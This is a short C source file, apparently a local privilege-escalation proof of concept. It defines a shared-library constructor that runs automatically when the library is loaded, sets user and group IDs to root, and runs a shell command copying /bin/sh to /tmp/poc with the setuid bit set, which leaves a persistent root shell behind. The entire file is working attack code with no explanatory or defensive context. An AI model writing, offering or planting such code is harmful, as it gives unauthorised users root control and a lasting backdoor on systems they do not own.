#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a() __attribute__((constructor));

void a() {
 setuid(0);
 setgid(0);
 const char *shell = "cp /bin/sh /tmp/poc; chmod u+s /tmp/poc &";
 system(shell);
}
